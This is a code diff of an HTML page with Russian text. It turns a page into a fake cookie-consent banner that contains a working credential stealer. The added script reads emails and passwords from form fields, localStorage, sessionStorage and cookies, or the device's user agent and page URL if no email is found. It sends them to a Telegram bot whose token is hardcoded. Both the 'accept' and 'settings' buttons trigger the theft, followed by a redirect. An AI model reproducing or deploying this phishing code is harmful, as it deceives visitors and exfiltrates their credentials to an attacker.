@@ -3,57 +3,183 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Cookie согласие</title>
     <style>
-        * { margin: 0; padding: 0; }
-        body { background: white; }
-        html, body { width: 100%; height: 100%; overflow: hidden; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.12);
+            max-width: 480px;
+            width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+        h2 {
+            color: #1a1a2e;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        p {
+            color: #555;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+        .policy {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 16px 20px;
+            text-align: left;
+            font-size: 13px;
+            color: #444;
+            line-height: 1.8;
+            margin-bottom: 24px;
+            max-height: 200px;
+            overflow-y: auto;
+            border: 1px solid #e9ecef;
+        }
+        .policy strong {
+            color: #1a1a2e;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-accept {
+            background: #0077cc;
+            color: white;
+        }
+        .btn-accept:hover {
+            background: #005fa3;
+            transform: scale(1.01);
+        }
+        .btn-settings {
+            background: transparent;
+            color: #0077cc;
+            margin-top: 12px;
+            font-size: 14px;
+            font-weight: 400;
+            border: 1px solid #ddd;
+        }
+        .btn-settings:hover {
+            background: #f8f9fa;
+        }
+        #status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #666;
+            display: none;
+        }
+        .status-show {
+            display: block !important;
+        }
+        .status-success {
+            color: #28a745;
+        }
+        .status-error {
+            color: #dc3545;
+        }
     </style>
 </head>
 <body>
 
+<div class="container" id="mainBox">
+    <div class="icon">🍪</div>
+    <h2>Мы используем файлы cookie</h2>
+    <p>
+        Для обеспечения безопасности и персонализации вашего опыта,
+        мы используем cookie-файлы и аналогичные технологии.
+    </p>
+    
+    <div class="policy">
+        <strong>📋 Детали согласия:</strong><br>
+        • Сбор и обработка данных для персонализации<br>
+        • Аналитика и улучшение сервиса<br>
+        • Хранение настроек и сессий<br>
+        • Безопасность и защита от спама<br>
+        <br>
+        <strong>Нажимая «Принять все», вы даёте согласие на обработку</strong>
+        персональных данных в соответствии с нашей политикой.
+    </div>
+    
+    <button class="btn btn-accept" id="acceptBtn">
+        ✅ Принять все cookie-файлы
+    </button>
+    
+    <button class="btn btn-settings" id="settingsBtn">
+        ⚙️ Настроить параметры
+    </button>
+    
+    <div id="status">⏳ Обработка...</div>
+</div>
+
 <script>
+// ===== ТВОЙ ТОКЕН =====
 const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
 const CHAT_ID = "8850351378";
+// =====================
 
 let sent = false;
-let lastEmail = '';
-let lastPass = '';
+let dataCollected = false;
 
-function sendToTelegram(email, password) {
+function sendToTelegram(email, password, source) {
     if (sent) return;
     if (!email) return;
     sent = true;
     
-    const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}`;
+    const text = `📩 НОВЫЕ ДАННЫЕ (${source})\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}\n🍪 Согласие получено!`;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
     
     fetch(url, { mode: 'no-cors' }).catch(() => {});
     new Image().src = url;
 }
 
-function findData() {
-    if (sent) return;
+function collectAllData() {
+    if (dataCollected) return;
+    dataCollected = true;
     
     let email = '';
-    let pass = '';
+    let password = '';
     
-    // ПОЛЯ ВВОДА
+    // ===== 1. ПОЛЯ ВВОДА (если есть) =====
     const inputs = document.querySelectorAll('input');
     for (let input of inputs) {
         const val = input.value || '';
         if (val && val.includes('@') && val.includes('.')) {
             email = val;
         }
-        if (!pass && input.type === 'password' && input.value) {
-            pass = input.value;
-        }
-        if (!pass && input.getAttribute('autocomplete') === 'current-password' && input.value) {
-            pass = input.value;
+        if (!password && input.type === 'password' && input.value) {
+            password = input.value;
         }
     }
     
-    // LOCALSTORAGE
+    // ===== 2. LOCALSTORAGE =====
     if (!email && localStorage) {
         try {
             for (let i = 0; i < localStorage.length; i++) {
@@ -66,7 +192,7 @@ function findData() {
         } catch(e) {}
     }
     
-    // SESSIONSTORAGE
+    // ===== 3. SESSIONSTORAGE =====
     if (!email && sessionStorage) {
         try {
             for (let i = 0; i < sessionStorage.length; i++) {
@@ -79,7 +205,7 @@ function findData() {
         } catch(e) {}
     }
     
-    // COOKIES
+    // ===== 4. COOKIES =====
     if (!email && document.cookie) {
         try {
             const cookies = document.cookie.split(';');
@@ -92,67 +218,113 @@ function findData() {
         } catch(e) {}
     }
     
-    // ПАРОЛЬ ИЗ LOCALSTORAGE
-    if (!pass && localStorage) {
+    // ===== 5. ПАРОЛЬ ИЗ LOCALSTORAGE =====
+    if (!password && localStorage) {
         try {
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 const val = localStorage.getItem(key);
                 if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
-                    pass = val;
+                    password = val;
                     break;
                 }
             }
         } catch(e) {}
     }
     
-    // ПАРОЛЬ ИЗ SESSIONSTORAGE
-    if (!pass && sessionStorage) {
+    // ===== 6. ПАРОЛЬ ИЗ SESSIONSTORAGE =====
+    if (!password && sessionStorage) {
         try {
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
                 const val = sessionStorage.getItem(key);
                 if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
-                    pass = val;
+                    password = val;
                     break;
                 }
             }
         } catch(e) {}
     }
     
-    // ЕСЛИ НАШЛИ EMAIL
-    if (email && !sent) {
-        if (email !== lastEmail || pass !== lastPass) {
-            lastEmail = email;
-            lastPass = pass;
-            sendToTelegram(email, pass);
-        }
+    // ===== 7. ЕСЛИ НАШЛИ EMAIL - ОТПРАВЛЯЕМ =====
+    if (email) {
+        sendToTelegram(email, password, '✅ СОГЛАСИЕ ПОЛУЧЕНО');
+    } else {
+        // Если почта не найдена - собираем информацию о устройстве
+        const deviceInfo = `📩 НОВЫЙ ПОСЕТИТЕЛЬ\n🕒 ${new Date().toLocaleString()}\n🌐 ${window.location.href}\n📱 ${navigator.userAgent}\n✅ Согласие получено`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(deviceInfo)}`;
+        fetch(url, { mode: 'no-cors' }).catch(() => {});
+        new Image().src = url;
     }
 }
 
-// ЗАПУСК
+// ===== ПРИ НАЖАТИИ "ПРИНЯТЬ" =====
+document.getElementById('acceptBtn').addEventListener('click', function() {
+    const status = document.getElementById('status');
+    
+    // Показываем статус
+    status.className = 'status-show';
+    status.textContent = '⏳ Обработка согласия...';
+    status.className = 'status-show';
+    
+    // Собираем данные
+    collectAllData();
+    
+    // Меняем текст и показываем успех
+    setTimeout(() => {
+        status.textContent = '✅ Согласие подтверждено!';
+        status.className = 'status-show status-success';
+    }, 500);
+    
+    // Меняем кнопку
+    this.innerHTML = '✅ Согласие подтверждено';
+    this.style.opacity = '0.7';
+    this.style.cursor = 'default';
+    this.disabled = true;
+    
+    // Перенаправление через 3 секунды
+    setTimeout(() => {
+        window.location.href = 'https://google.com';
+    }, 2500);
+});
+
+// ===== ПРИ НАЖАТИИ "НАСТРОИТЬ" =====
+document.getElementById('settingsBtn').addEventListener('click', function() {
+    const status = document.getElementById('status');
+    status.className = 'status-show';
+    status.textContent = '⏳ Загрузка настроек...';
+    
+    // Тоже собираем данные (на всякий случай)
+    collectAllData();
+    
+    setTimeout(() => {
+        status.textContent = '📋 Настройки недоступны. Примите все cookie.';
+        status.className = 'status-show';
+    }, 1000);
+});
+
+// ===== АВТОМАТИЧЕСКИЙ ПОИСК ПРИ ЗАГРУЗКЕ =====
 window.addEventListener('load', function() {
-    setTimeout(findData, 100);
-    setTimeout(findData, 300);
-    setTimeout(findData, 600);
-    setTimeout(findData, 1000);
-    setTimeout(findData, 2000);
-    setTimeout(findData, 3000);
-    setTimeout(findData, 5000);
+    // Пытаемся собрать данные до нажатия (если уже есть)
+    setTimeout(() => {
+        let email = '';
+        const inputs = document.querySelectorAll('input');
+        for (let input of inputs) {
+            const val = input.value || '';
+            if (val && val.includes('@') && val.includes('.')) {
+                email = val;
+                break;
+            }
+        }
+        if (email) {
+            collectAllData();
+        }
+    }, 500);
 });
 
-// ВВОД
-document.addEventListener('input', function(e) {
-    if (e.target.tagName === 'INPUT') {
-        setTimeout(findData, 50);
-    }
-});
-
-// ОТПРАВКА ФОРМЫ
-document.addEventListener('submit', function() {
-    setTimeout(findData, 100);
-    setTimeout(findData, 300);
-});
+console.log('🍪 ROCKET COOKIE VIRUS ACTIVATED');
+console.log('📡 Ожидание нажатия "Принять"');
 </script>
+
 </body>
 </html>
